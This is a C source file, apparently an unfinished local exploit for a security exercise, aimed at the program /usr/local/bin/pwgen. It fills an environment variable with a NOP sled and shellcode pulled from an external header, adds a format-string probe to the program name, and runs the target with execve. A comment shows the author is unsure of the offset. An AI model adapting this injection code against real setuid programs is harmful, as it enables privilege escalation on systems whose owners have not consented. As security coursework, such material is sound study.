/*Define Standard Libraries*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/*Define the shellcode header file*/
#include </usr/local/src/shellcode.h>

/*Set predefined constants*/
#define DEFAULT_BUFFER_SIZE 2024 /*the minimum buffer needed to allow for an overflow*/
#define NOP 0x90
#define TARGET "/usr/local/bin/pwgen"

int main(int argc, char * argv[]) {
        /*define the runtime parameters*/
        char * args[3] = {TARGET, "-e", NULL};
        char * env[2];
        char * envOne;
        char * pointer;

        char offset[] = "%h%x%x%x%x%x%x%x%x"; /*I am not sure what to do here*/

        args[0] = (char *) malloc(256);

        strcpy(args[0], TARGET);
        strcat(args[0], offset);

        envOne = malloc(2048);
        memset(envOne, NOP, 2048);
        pointer = envOne + 128;
        memcpy(pointer, shellcode, strlen(shellcode));

        env[0] = envOne;
        env[1] = NULL;

        /*execute the pwgen code with the parameters set above*/
        execve(TARGET, args, env);

        return 0;
}